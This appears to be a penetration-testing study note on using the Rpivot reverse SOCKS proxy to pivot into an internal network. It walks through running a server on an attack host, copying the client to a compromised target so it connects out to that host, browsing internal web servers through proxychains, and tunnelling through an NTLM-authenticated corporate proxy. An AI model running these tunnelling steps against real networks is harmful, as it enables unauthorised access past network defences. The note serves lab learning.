- [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.
- Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.
- **Note: Requires Attack Host and Pivot Target to have pytthon 2.7 installed**
 
![[Pasted image 20230407224108.png|700]]
- In the above scenario there is a web server on the internal network we want to access using the rpivot proxy.

#### Clone rpivot
``` bash
sudo git clone https://github.com/klsecservices/rpivot.git
```

#### Install Python2.7
``` bash
sudo apt-get install python2.7
```

#### Run server.py from the Attack Host
``` bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### Transfer rpivot to Target
``` bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Run client.py from Pivot Target
``` bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
- Verify connection is established on server.
- **Configure proxychains to pivot on our localserver `127.0.0.1:9050`**

#### Browse to Target Webserver using Proxychains
``` bash
proxychains firefox-esr 172.16.5.135:80
```

#### Connect to a Web Server using HTTP-Proxy & NTLM Auth
- There can be scenarios where we can't directly pivot to an external server (attack host) on the cloud.
- Some orgs have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller.
	- We can provide NTLM auth to rpivot
``` bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```